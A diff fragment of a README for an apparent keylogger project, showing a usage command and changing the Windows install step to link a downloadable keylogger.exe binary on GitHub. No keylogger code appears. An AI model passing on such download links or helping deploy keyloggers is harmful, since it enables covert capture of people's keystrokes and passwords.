@@ -39,7 +39,7 @@ python3 keylogger.py -V
 ```
 #### INSTALLATION
 - **`Windows`**
-- > just download the keylogger.exe
+- > just download the <a href='https://github.com/7AXEL/KEYLOGGER/raw/main/keylogger.exe'>keylogger.exe</a>
 - **`Linux`**
 - > open the terminal and write those commands:
 ```
